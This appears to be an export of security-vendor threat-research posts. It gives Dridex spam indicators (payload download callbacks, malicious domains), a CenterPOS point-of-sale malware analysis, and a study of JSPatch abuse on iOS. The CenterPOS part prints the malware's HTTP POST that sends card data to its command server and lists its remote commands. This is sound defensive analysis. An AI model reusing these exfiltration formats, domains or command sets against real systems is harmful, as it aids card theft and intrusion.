  <span class=""type-XS"">Figure 3: Targeted countries</span></p>
 <p>Here are quick summaries and indicators for some of the prominent campaigns.</p>
 <h4>
  <b>British Gas account spam, week of January 11</b></h4>
 <p>
  <b>Sample email:</b></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Dridex%20returns/Figure%204.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. British Gas themed spam message</span></p>
 <p>
  <b>Sending addresses:</b></p>
 <p>·      khouse2@kochind.onmicrosoft.com<br /> ·      trinity&lt;xxxx&gt;@topsource.co.uk</p>
 <p>
  <b>Subject lines:</b></p>
 <p>British Gas - A/c No. 602131633 - New Account</p>
 <p>
  <b>Attachment names:</b></p>
 <p>British Gas.doc</p>
 <p>
  <b>Callback patterns:</b></p>
 <p>GET /l9k7hg4/b4387kfd.exe HTTP/1.1</p>
 <p>
  <b>Callback IPs/domains:</b></p>
 <p>·      amyzingbooks.com<br /> ·      powerstarthosting.com<br />
  ·      webdesignoshawa.ca</p>
 <h4> </h4>
 <h4>
  <b>Telephone bill themed spam, week of January 18</b></h4>
 <p>
  <b>Sample email:</b></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Dridex%20returns/Figure%205.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Telephone bill themed spam message</span>
  <b></b></p>
 <p>
  <b>
    <br /> Sending addresses:</b></p>
 <p>The Billing Team &lt;noreply@callbilling.co.uk&gt;</p>
 <p>
  <b>Subject lines:</b></p>
 <p>Your Telephone Bill Invoices &amp; Reports</p>
 <p>
  <b>Attachment names:</b></p>
 <p>Invoice_316103_Jul_2013.doc</p>
 <p>
  <b>Callback patterns:</b></p>
 <p>GET /8h75f56f/34qwj9kk.exe HTTP/1.1</p>
 <p>
  <b>Callback IPs/domains:</b></p>
 <p>·      bolmgren.com<br /> ·      phaleshop.com<br /> ·      return-gaming.de</p>
 <p> </p>
 <h4>
  <b>New Order spam, week of January 25</b></h4>
 <p>Sample email:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Dridex%20returns/Figure%206.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. New Order-themed spam message</span></p>
 <p>
  <b>Sending addresses:</b></p>
 <p>Michelle.Ludlow@dssmith.com</p>
 <p>
  <b>Subject lines:</b></p>
 <p>New Order</p>
 <p>
  <b>Attachment names:</b></p>
 <p>doc4502094035.doc</p>
 <p>
  <b>Callback patterns:</b></p>
 <p>·      GET /4f4f/7u65j5hg.exe HTTP/1.1<br /> ·      GET
  /54t4f4f/7u65j5hg.exe HTTP/1.1</p>
 <p>
  <b>Callback IPs/domains:</b></p>
 <p>·      elta-th.com<br /> ·      grudeal.com<br /> ·     
  trendcheckers.com<br /> ·      vinagps.net<br /> ·     
  www.cityofdavidchurch.org<br /> ·      www.hartrijders.com</p>
 <h4>
  <b>Conclusion</b></h4>
 <p>The Dridex operators may have taken a break after Christmas, but
  soon after the New Year they ramped up their activities and resumed
  their operations as usual. It is important for organizations to remain
  vigilant with user education, proactive detection technologies and
  security policies that help prevent cybersecurity threats.</p>
 <h4>Acknowledgements</h4>
 <p>Thanks to Joonho Sa for contributing to this research.<br /> </p>",http://www.fireeye.com/blog/threat-research/2016/01/dridex_botnet_resume.html
CenterPOS: An Evolving POS Threat,"<h4>
  <b>Introduction</b></h4>
 <p>There has been no shortage of point-of-sale (POS) threats in the
  past couple of years. This type of malicious software has gained
  widespread notoriety in recent time due to its use in high-profile
  breaches, some of which involved well-known brick and mortar retailers
  and led to the compromise of millions of payment cards. Our
  investigation into these threats has led to the analysis of a
  relatively newer POS malware known as CenterPOS.</p>
 <h4>
  <b>CenterPOS</b></h4>
 <p>CenterPOS malware was <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/two-new-pos-malware-affecting-us-smbs/"">initially
  discovered</a> in September 2015 in a directory filled with other POS
  malware, including NewPoSThings, two Alina variants known as “Spark”
  and “Joker,” and BlackPOS. This CenterPOS sample
  (171c4c62ab2001c2f2394c3ec021dfa3) contains an internal version of
  “1.7” and is a memory scraper that iterates through running processes
  in order to extract payment card information. The payment card
  information is transferred to a command and control (CnC) server via
  HTTP POST:</p>
 <p>
  <span class=""code"">    POST /2kj1h43.php HTTP/1.1</span>
  <br /> <span class=""code"">    Content-Type: multipart/form-data; boundary=axlmcc3u.x5w</span>
  <br /> <span class=""code"">    Host: jackkk[.]com</span>
  <br /> <span class=""code"">    Content-Length: 159</span>
  <br /> <span class=""code"">    Expect: 100-continue</span>
  <br /> <span class=""code"">    Connection: Keep-Alive</span></p>
 <p>
  <span class=""code"">    --axlmcc3u.x5w</span></p>
 <p>
  <span class=""code"">    Content-Disposition: form-data; name=&quot;userfile&quot;;filename=&quot;1432.txt&quot;</span>
  <br /> <span class=""code"">    Content-Type: application/octet-stream</span></p>
 <p>
  <span class=""code"">    AAAAAAAAAAAA</span>
  <br /> <span class=""code"">    --axlmcc3u.x5w--</span></p>
 <p>Table 1 shows several CenterPOS v1.7 variants and their associated
  CnC locations.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""160""><p>MD5</p> </td> <td valign=""top"" width=""160""><p>CnC</p> </td> <td valign=""top"" width=""160""><p>Version</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>171c4c62ab2001c2f2394c3ec021dfa3</p> </td> <td valign=""top"" width=""160""><p>jackkk[.]com</p> <p>(resolves to
        138.204.168.109)</p> </td> <td valign=""top"" width=""160""><p>1.7</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>7e6b2f107f6dbc1bc406f4359de4c5db</p> </td> <td valign=""top"" width=""160""><p>188.120.227.156</p> </td> <td valign=""top"" width=""160""><p>1.7</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>ef5e361a6b16d682e1506aba6164feee</p> </td> <td valign=""top"" width=""160""><p>188.120.227.156</p> </td> <td valign=""top"" width=""160""><p>1.7</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>c9d4ff350f26c11b934e19bb1ef7698d</p> </td> <td valign=""top"" width=""160""><p>rs000370.fastrootserver[.]de</p>
          <p>(resolves to 89.163.209.117)</p> </td> <td valign=""top"" width=""160""><p>1.7</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>0d142438f731652b746c9ad7fd1a9850</p> </td> <td valign=""top"" width=""160""><p>sobra[.]ws</p> <p>(resolves to
        50.7.193.210)</p> </td> <td valign=""top"" width=""160""><p>1.7</p>
      </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 1: CenterPOS v1.7 samples</span></p>
 <p>We discovered a live CnC server (the admin panel is shown in Figure
  1) that allowed us to confirm that CenterPOS is known as “Cerebrus” in
  the underground (not to be confused with the RAT known as Cerberus).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CenterPOS/figure1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Cerebrus 1.7 (CenterPOS) Admin Panel Login</span></p>
 <p>Further investigation revealed that there is a new version of
  CenterPOS, version 2.0, that is functionally very similar to version
  1.7. The key difference is that version 2.0 uses a configuration file
  to store the CnC information. When executed, the malware checks for a
  configuration file that can be located in one of three locations:</p>
 <ul> <li>Appended to the end of the file enclosed by the strings [dup]
    ... [/dup].</li> <li>A file named mscorsv.nlp located in the same
  directory.</li> <li>In the registry:
  HKLM\SYSTEM\CurrentControlSet\Control\Framework.NET</li> </ul>
 <p>If a configuration file is not present, the malware will open a
  dialog box that prompts for a password. If the correct password is
  entered, a dialog box will appear that allows an operator to enter CnC
  information, as well as a password used to encrypt the configuration
  file (see Figure 2).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CenterPOS/figure2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Cerebrus 2.0 (CenterPOS) Configuration Builder</span></p>
 <p>The malware contains two modes for scraping memory and looking for
  credit card information, a “smart scan” mode and a “normal scan” mode.
  The “normal scan” mode will act nearly the same as v1.7:</p>
 <p>The malware iterates over all processes and begins searching process
  memory space if the process meets the following criteria:</p>
 <ul> <li>The process is not the current running process.</li> <li>The
    process name is not in the ignore list.</li> <li>The process name is
    not “system,” “system idle process,” or “idle.”</li> <li>The process
    file version info does not contain “microsoft,” “apple inc,” “adobe
    systems,” “intel corporation,” “vmware,” “mozilla,” or “host process
    for windows services.”</li> <li>The process full path's SHA-256 hash
    is not in the SHA-256 blacklist.</li> </ul>
 <p>If the process meets the criteria list, the malware will search all
  memory regions within the process searching for credit card data with
  regular expressions in the regular expression list.</p>
 <p>In “smart scan” mode, the malware starts by performing a “normal
  scan.” Any process that has a regular expression match will be added
  to the “smart scan” list. After the first pass, the malware will only
  search the processes that are in the “smart scan” list.</p>
 <p>After each iteration of scanning all process memory, the malware
  takes any data that matches and encrypts it using TripleDES with the
  key found in the configuration file.</p>
 <p>The malware will send information about the system and the current
  settings to the CnC server after every other search. The gathered
  system information includes all system users, logged in users,
  sessions, process list, and current settings list. Each of these items
  will be sent in a separate HTTP POST request.</p>
 <p>The malware primarily sends data to the CnC server, but can also
  receive commands. The malware can receive and process the following
  list of commands:</p>
 <ul> <li>[restartnow] : Restarts the malware service.</li>
    <li>[uninstallnow] : Uninstalls the malware.</li> <li>[quitnow] :
    Terminates the current malware process.</li> <li>&lt;script&gt; :
    &lt;script&gt; is a batch script to be run on the system.</li> </ul>
 <p>In addition to processing commands, the malware also accepts
  commands to update its current settings. The following list shows the
  settings that can be changed:</p>
 <ul> <li>[clientlogs] : Enable or disable logging.</li> <li>[smartscan]
    : Enables or disables “smart scan.”</li> <li>[bincountreset] : Total
    number of processes to scan before restarting a scan.</li>
    <li>[blackmamba] : List of blacklisted values that could be matched
    on by the regular expressions.</li> <li>[blackproc] : List of
    blacklisted process names.</li> <li>[regexlist] : Updates the
    regular expression list for searching process memory.</li>
    <li>[blacksha256] : Updates the blacklist of full path SHA-256
    values for processes. Processes in this black list will be
  terminated.</li> <li>[antihack] : Checks the Image File Execution
    Options settings for several executables and deletes the “Debugger”
    value name settings and deletes them if they exist. The executable
    list is: sethc.exe, osk.exe, utilman.exe, magnify.exe, and
  oks.exe.</li> <li>[commonblackcards] : Use blackmamba blacklisted
  values.</li> <li>[restartafter] : Restarts the service after a number
    of memory scan iterations.</li> <li>[restart] : Restarts the malware
  service.</li> <li>[uninstall] : Uninstalls the malware.</li> </ul>
 <p>The operators control the compromised systems and harvest stolen
  payment card information through a web interface located on the CnC
  server, as shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CenterPOS/figure3.png"" />
  <i>
    <br /> </i>
  <span class=""type-XS"">Figure 3: Cerebrus 2.0 (CenterPOS) Admin Panel Login</span>
  <i></i></p>
 <p> Table 2 shows several CenterPOS v2.0 variants and their associated
  CnC locations.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""160""><p>MD5</p> </td> <td valign=""top"" width=""160""><p>CnC</p> </td> <td valign=""top"" width=""160""><p>Version</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>1acf2eed3c5a8a85a34e606dd897eaac</p> </td> <td valign=""top"" width=""160""><p>www.x00x[.]la</p> <p>(resolves to
        193.189.117.58)</p> </td> <td valign=""top"" width=""160""><p>2.0</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>96b65da18a72987e1dd3be2a947412c5</p> </td> <td valign=""top"" width=""160""><p>193.111.139.142</p> </td> <td valign=""top"" width=""160""><p>2.0</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>a54b0812f003bb15891709ab7a125828</p> </td> <td valign=""top"" width=""160""><p>5m0k3[.]lol</p> <p>(resolves to
        193.189.117.58)</p> </td> <td valign=""top"" width=""160""><p>2.0</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""160""><p>1d7d70c0699db32817f910942e7a619a</p> </td> <td valign=""top"" width=""160""><p>www.amprofile.co[.]uk</p>
          <p>(resolves to 193.189.116.29)</p> </td> <td valign=""top"" width=""160""><p>2.0</p> </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Table 2: CenterPOS v2.0 samples</span></p>
 <h3>
  <b>Conclusion</b></h3>
 <p>There is an increasing demand for POS malware in the underground as
  cybercriminals continue to target retailers in order to steal payment
  card information. CenterPOS, known in the underground as Cerebrus, is
  continuing to evolve. This version contains functionality that allows
  cybercriminals to create a configuration file. In contrast to the
  traditional builder-server model, the configuration file can be
  created from the payload itself, allowing the operators to easily
  update the CnC information if necessary.</p>",http://www.fireeye.com/blog/threat-research/2016/01/centerpos_an_evolvi.html
Hot or Not? The Benefits and Risks of iOS Remote Hot Patching,"<h2>
  <span class=""type-L"">Introduction</span></h2>
 <p>Apple has made a significant effort to build and maintain a healthy
  and clean app ecosystem. The essential contributing component to this
  status quo is the App Store, which is protected by a thorough vetting
  process that scrutinizes all submitted applications. While the process
  is intended to protect iOS users and ensure apps meet Apple’s
  standards for security and integrity, developers who have experienced
  the process would agree that it can be difficult and time consuming.
  The same process then must be followed when publishing a new release
  or issuing a patched version of an existing app, which can be
  extremely frustrating when a developer wants to patch a severe bug or
  security vulnerability impacting existing app users.</p>
 <p>The developer community has been searching for alternatives, and
  with some success. A set of solutions now offer a more efficient iOS
  app deployment experience, giving app developers the ability to update
  their code as they see fit and deploy patches to users’ devices
  immediately. While these technologies provide a more autonomous
  development experience, they do not meet the same security standards
  that Apple has attempted to maintain. Worse, these methods might be
  the Achilles heel to the walled garden of Apple’s App Store.</p>
 <p>In this series of articles, FireEye mobile security researchers
  examine the security risks of iOS apps that employ these alternate
  solutions for hot patching, and seek to prevent unintended security
  compromises in the iOS app ecosystem.</p>
 <p>As the first installment of this series, we look into an open source
  solution: <a href=""https://github.com/bang590/JSPatch/wiki"" target=""_blank"">JSPatch</a>.</p>
 <h2>
  <span class=""type-L"">Episode 1. JSPatch</span></h2>
 <p>
  <b>JSPatch</b> is an open source project – built on top of Apple’s
  <i>JavaScriptCore</i> framework – with the goal of providing an
  alternative to Apple’s arduous and unpredictable review process in
  situations where the timely delivery of hot fixes for severe bugs is
  vital. In the author’s own words (<b>bold</b> added for emphasis):</p>
 <table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""323""> <tbody>
    <tr>
      <td valign=""top"" width=""323""><p style=""margin-left: 40.0px;"">JSPatch bridges Objective-C and
          JavaScript using the Objective-C runtime. You can call
          <b>any</b> Objective-C class and method in JavaScript by just
          including a small engine. That makes the APP obtaining the
          power of script language: <a href=""https://github.com/bang590/JSPatch/wiki/Quick-start"" target=""_blank"">add modules or replacing Objective-C code to
            fix bugs <b>dynamically</b></a>.</p> </td> </tr></tbody></table>
 <h2>
  <span class=""type-L"">JSPatch Machinery</span></h2>
 <p>The JSPatch author, using the alias <i>Bang,</i> provided a common
  example of how <a href=""http://blog.cnbang.net/works/2767/"" target=""_blank"">JSPatch can be used to update a faulty iOS app</a>
  on his blog:</p>
 <p>Figure 1 shows an <i>Objc </i>implementation of a
  <i>UITableViewController</i> with class name
  <i>JPTableViewController</i> that provides data population via the
  selector <i>tableView:didSelectRowAtIndexPath:</i>. At line 5, it
  retrieves data from the backend source represented by an array of
  strings with an index mapping to the selected row number. In many
  cases, this functions fine; however, when the row index exceeds the
  range of the data source array, which can easily happen, the program
  will throw an exception and subsequently cause the app to crash.
  Crashing an app is never an appealing experience for users.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure1.png"" />
  <span class=""type-XS"">Figure 1. Buggy Objc code without JSPatch</span></p>
 <p>Within the realm of Apple-provided technologies, the way to
  remediate this situation is to rebuild the application with updated
  code to fix the bug and submit the newly built app to the App Store
  for approval. While the review process for updated apps often takes
  less time than the initial submission review, the process can still be
  time-consuming, unpredictable, and can potentially cause loss of
  business if app fixes are not delivered in a timely and controlled manner.</p>
 <p>However, if the original app is embedded with the <i>JSPatch</i>
  engine, its behavior can be changed according to the JavaScript code
  loaded at runtime. This JavaScript file
  (<i>hxxp://cnbang.net/bugfix.JS</i> in the above example) is remotely
  controlled by the app developer. It is delivered to the app through
  network communication.   </p>
 <p>Figure 2 shows the standard way of setting up <i>JSPatch</i> in an
  iOS app. This code would allow download and execution of a JavaScript
  patch when the app starts:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure2.png"" />
  <span class=""type-XS"">Figure 2. Objc code enabling JSPatch in an app</span></p>
 <p>JSPatch is indeed lightweight. In this case, the only additional
  work to enable it is to add seven lines of code to the
  <i>application:didFiishLaunchingWithOptions:</i> selector. Figure 3
  shows the JavaScript downloaded from
  <i>hxxp://cnbang.net/bugfix.JS</i> that is used to patch the faulty code.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure3.png"" />
  <span class=""type-XS"">Figure 3. JSPatch hot patch fixing index out of
    bound bug in Figure 1</span></p>
 <h2>
  <span class=""type-L"">Malicious Capability Showcase</span></h2>
 <p>
  <i>JSPatch</i> is a boon to iOS developers. In the right hands, it can
  be used to quickly and effectively deploy patches and code updates.
  But in a non-utopian world like ours, we need to assume that bad
  actors will leverage this technology for unintended purposes.
  Specifically, if an attacker is able to tamper with the content of
  JavaScript file that is eventually loaded by the app, a range of
  attacks can be successfully performed against an App Store application.</p>
 <h2>
  <span class=""type-L"">Target App</span></h2>
 <p>We randomly picked a legitimate app<a name=""_ftnref4""></a><sup>
    <sup>[1]</sup></sup> with JSPatch enabled from the App Store. The
  logistics of setting up the JSPatch platform and resources for code
  patching are packaged in this routine <i>[AppDelegate
  excuteJSPatch:]</i>, as shown in Figure 4<a name=""_ftnref5""></a><sup>
    <sup>[2]</sup></sup>:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. JSPatch setup in the targeted app</span></p>
 <p>There is a sequence of flow from the app entry point (in this case
  the <i>AppDelegate</i> class) to where the JavaScript file containing
  updates or patch code is written to the file system. This process
  involves communicating with the remote server to retrieve the patch
  code. On our test device, we eventually found that the JavaScript
  patch code is hashed and stored at the location shown in Figure 5. The
  corresponding content is shown in Figure 6 in Base64-encoded format:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Location of downloaded JavaScript on
    test device</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure6.png"" />
  <span class=""type-XS"">
    <br /> Figure 6. Encrypted patch content</span></p>
 <p>While the target app developer has taken steps to secure this
  sensitive data from prying eyes by employing Base64 encoding on top of
  a symmetric encryption, one can easily render this attempt futile by
    <a href=""http://www.cycript.org/"" target=""_blank"">running a few
    commands through Cycript</a>. The patch code, once decrypted, is
  shown in Figure 7:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure7.png"" />
  <span class=""type-XS"">Figure 7. Decrypted original patch content
    retrieved from remote server</span></p>
 <p>This is the content that gets loaded and executed by
  <i>JPEngine,</i> the component provided by the JSPatch framework
  embedded in the target app. To change the behavior of the running app,
  one simply needs to modify the content of this JavaScript blob. Below
  we show several possibilities for performing malicious actions that
  are <a href=""https://developer.apple.com/app-store/review/guidelines/"" target=""_blank"">against Apple’s App Review Guidelines</a>. Although
  the examples below are from a jailbroken device, we have demonstrated
  that they will work on non-jailbroken devices as well.</p>
 <p>
  <b>Example 1: </b>Load arbitrary <b>public</b> frameworks into app process</p>
 <p>
  <b>a</b>.     Example public framework<i>: /System/Library/Frameworks/Accounts.framework</i>
  <br /> <b>b</b>.     Private APIs used by public framework:
    <i>[ACAccountStore init]</i>, <i>[ACAccountStore allAccountTypes]</i></p>
 <p>The target app discussed above, when running, loads the frameworks
  shown in Figure 8 into its process memory:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure8.png"" />
  <span class=""type-XS"">
    <br /> Figure 8. iOS frameworks loaded by the target app</span></p>
 <p>Note that the list above – generated from the Apple-approved iOS app
  binary – does not contain <i>Accounts.framework</i>. Therefore, any
  “dangerous” or “risky” operations that rely on the APIs provided by
  this framework are not expected to take place. However, the JavaScript
  code shown in Figure 9 invalidates that assumption.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure9.png"" />
  <span class=""type-XS"">Figure 9. JavaScript patch code that loads the
    Accounts.framework into the app process</span></p>
 <p>If this JavaScript code were delivered to the target app as a hot
  patch, it could dynamically load a public framework,
  <i>Accounts.framework</i>, into the running process. Once the
  framework is loaded, the script has full access to all of the
  framework’s APIs. Figure 10 shows the outcome of executing the private
  API <i>[ACAccountStore allAccountTypes], </i>which outputs 36 account
  types on the test device<i>.</i> This added behavior does not require
  the app to be rebuilt, nor does it require another review through the
  App Store.  </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure10.png"" />
  <span class=""type-XS"">Figure 10. The screenshot of the console log for
    utilizing Accounts.framework</span></p>
 <p>The above demonstration highlights a serious security risk for iOS
  app users and app developers. The JSPatch technology potentially
  allows an individual to effectively circumvent the protection imposed
  by the App Store review process and perform arbitrary and powerful
  actions on the device without consent from the users. The dynamic
  nature of the code makes it extremely difficult to catch a malicious
  actor in action. We are not providing any meaningful exploit in this
  blog post, but instead only pointing out the possibilities to avoid
  low-skilled attackers taking advantage of off-the-shelf exploits.</p>
 <p>
  <b>Example 2: </b>Load arbitrary <b>private </b>frameworks into app process</p>
 <p>
  <b>a.     </b>Example private framework: <i>/System/Library/PrivateFrameworks/BluetoothManager.framework</i>
  <b>
    <br />  b.    </b>Private APIs used by example framework:
    [<i>BluetoothManager connectedDevices]</i>, <i>[BluetoothDevice name]</i></p>
 <p>Similar to the previous example, a malicious JSPatch JavaScript
  could instruct an app to load an arbitrary private framework, such as
  the <i>BluetoothManager.framework</i>, and further invoke private APIs
  to change the state of the device.<i> </i>iOS private frameworks are
  intended to be used solely by Apple-provided apps. While there is no
  official public documentation regarding the usage of private
  frameworks, it is common knowledge that many of them provide private
  access to low-level system functionalities that may allow an app to
  circumvent security controls put in place by the OS. The App Store has
  a strict policy prohibiting third party apps from using any private
  frameworks. However, it is worth pointing out that the operating
  system does not differentiate Apple apps’ private framework usage and
  a third party app’s private framework usage. It is simply the App
  Store policy that bans third party use.</p>
 <p>With JSPatch, this restriction has no effect because the JavaScript
  file is not subject to the App Store’s vetting. Figure 11 shows the
  code for loading the <i>BluetoothManager.framework</i> and utilizing
  APIs to read and change the states of Bluetooth of the host device.
  Figure 12 shows the corresponding console outputs.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure11.png"" />
  <span class=""type-XS"">Figure 11. JavaScript patch code that loads the
    BluetoothManager.framework into the app process</span></p>
 <p> </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure12.png"" />
  <span class=""type-XS"">Figure 12. The screenshot of the console log for
    utilizing BluetoothManager.framework</span></p>
 <p>
  <b>Example 3: </b>Change system properties via private API</p>
 <p>
  <b>a</b>.     Example dependent framework:
  <i>b</i>/System/Library/Frameworks/CoreTelephony.framework<br />
    <b>b</b>.<i>    </i>Private API used by example framework:
    <i>[CTTelephonyNetworkInfo updateRadioAccessTechnology:]</i></p>
 <p>Consider a target app that is built with the public framework
  <i>CoreTelephony.framework</i>. Apple documentation explains that this
  framework allows one to obtain information about a user’s home
  cellular service provider. It exposes several public APIs to
  developers to achieve this, but <i>[CTTelephonyNetworkInfo
  updateRadioAccessTechnology:]</i> is not one of them. However, as
  shown in Figure 13 and Figure 14, we can successfully use this private
  API to update the device cellular service status by changing the radio
  technology from <i>CTRadioAccessTechnologyHSDPA</i> to
  <i>CTRadioAccessTechnologyLTE</i> without Apple’s consent.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure13.png"" />
  <span class=""type-XS"">Figure 13. JavaScript code that changes the
    Radio Access Technology of the test device</span></p>
 <p> </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure14.png"" />
  <span class=""type-XS"">Figure 14. Corresponding execution output of the
    above JavaScript code via Private API</span></p>
 <p>
  <b>Example 4: </b>Access to Photo Album (sensitive data) via public APIs</p>
 <p>
  <b>a</b>.     Example loaded framework: <i>/System/Library/Frameworks/Photos.framework</i>
  <br /> <b>b</b>.     Public APIs<i>: [PHAsset fetchAssetsWithMediaType:options:]</i></p>
 <p>Privacy violations are a major concern for mobile users. Any actions
  performed on a device that involve accessing and using sensitive user
  data (including contacts, text messages, photos, videos, notes, call
  logs, and so on) should be justified within the context of the service
  provided by the app. However, Figure 15 and Figure 16 show how we can
  access the user’s photo album by leveraging the private APIs from
  built-in <i>Photo.framework</i> to harvest the metadata of photos.
  With a bit more code, one can export this image data to a remote
  location without the user’s knowledge.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure15.png"" />
  <span class=""type-XS"">Figure 15. JavaScript code that access the Photo Library</span></p>
 <p> </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure16.png"" />
  <span class=""type-XS"">Figure 16. Corresponding output of the above
    JavaScript in Figure 15</span></p>
 <p>
  <b>Example 5: </b>Access to Pasteboard in real time</p>
 <p>
  <b>a</b>.     Example Framework: <i>/System/Library/Frameworks/UIKit.framework</i>
  <b>
    <br />  b</b>.     APIs: <i>[UIPasteboard strings], [UIPasteboard
    items], [UIPasteboard string]</i></p>
 <p>
  <a href=""https://developer.apple.com/library/ios/documentation/General/Conceptual/Devpedia-CocoaApp/Pasteboard.html"" target=""_blank"">iOS pasteboard is one of the mechanisms</a> that
  allows a user to transfer data between apps. Some security researchers
  have <a href=""http://www.andreas-kurtz.de/2014/09/malicious-apps-ios8.html"" target=""_blank"">raised concerns regarding its security</a>, since
  pasteboard can be used to transfer sensitive data such as accounts and
  credentials. Figure 17 shows a simple demo function in JavaScript
  that, when running on the JSPatch framework, scrapes all the string
  contents off the pasteboard and displays them on the console. Figure
  18 shows the output when this function is injected into the target
  application on a device.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure17.png"" />
  <span class=""type-XS"">Figure 17. JavaScript code that scraps the
    pasteboard which might contain sensitive information</span></p>
 <p> </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/HotPatch/Figure18.png"" />
  <span class=""type-XS"">Figure 18. Console output of the scraped content
    from pasteboard by code in Figure 17</span></p>
 <p>We have shown five examples utilizing JSPatch as an attack vector,
  and the potential for more is only constrained by an attacker’s
  imagination and creativity.</p>
 <h2>
  <span class=""type-L"">Future Attacks</span></h2>
 <p>Much of iOS’ native capability is dependent on C functions (for
  example, <i>dlopen()</i>, <i>UIGetImageScreen()</i>). Due to the fact
  that C functions cannot be reflectively invoked, JSPatch does not
  support direct Objective C to JavaScript mapping. In order to use C
  functions in JavaScript, an app must implement <a href=""https://github.com/bang590/JSPatch/wiki/Adding-new-extensions"" target=""_blank"">JSExtension,</a> which packs the C function into
  corresponding interfaces that are further exported to JavaScript.</p>
 <p>This dependency on additional Objective C code to expose C functions
  casts limitations on the ability of a malicious actor to perform
  operations such as taking stealth screenshots, sending and
  intercepting text messages without consent, stealing photos from the
  gallery, or stealthily recording audio. But these limitations can be
  easily lifted should an app developer choose to add a bit more
  Objective C code to wrap and expose these C functions. In fact, the
  JSPatch author could offer such support to app developers in the near
  future through more usable and convenient interfaces, granted there is
  enough demand. In this case, all of the above operations could become
  reality without Apple’s consent.</p>
 <h2>
  <span class=""type-L"">Security Impact</span></h2>
 <p>It is a general belief that iOS devices are more secure than mobile
  devices running other operating systems; however, one has to bear in
  mind that the elements contributing to this status quo are
  multi-faceted. The core of Apple’s security controls to provide and
  maintain a secure ecosystem for iOS users and developers is their
  walled garden – the App Store. Apps distributed through the App Store
  are significantly more difficult to leverage in meaningful attacks. To
  this day, two main attack vectors make up all previously disclosed
  attacks against the iOS platform:</p>
 <p>1.     Jailbroken iOS devices that allow unsigned or ill-signed apps
  to be installed due to the disabled signature checking function. In
  some cases, the sandbox restrictions are lifted, which allows apps to
  function outside of the sandbox.</p>
 <p>2.     App sideloading via Enterprise Certifications on
  non-jailbroken devices. FireEye published a series of <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html"" target=""_blank"">reports</a> that detailed attacks exploiting this
  attack surface, and recent reports show a continued focus on this
  known attack vector.</p>
 <p>However, as we have highlighted in this report, JSPatch offers an
  attack vector that does not require sideloading or a jailbroken device
  for an attack to succeed. It is not difficult to identify that the
  JavaScript content, which is not subject to any review process, is a
  potential Achilles heel in this app development architecture. Since
  there are few to zero security measures to ensure the security
  properties of this file, the following scenarios for attacking the app
  and the user are conceivable:</p>
 <p>●      <b>Precondition</b>: 1) App embeds <i>JSPatch</i> platform;
  2) App Developer has malicious intentions.</p>
 <p>○      <b>Consequences</b>: The app developer can utilize all the
  Private APIs provided by the loaded frameworks to perform actions that
  are not advertised to Apple or the users. Since the developer has
  control of the JavaScript code, the malicious behavior can be
  temporary, dynamic, stealthy, and evasive. Such an attack, when in
  place, will pose a big risk to all stakeholders involved.</p>
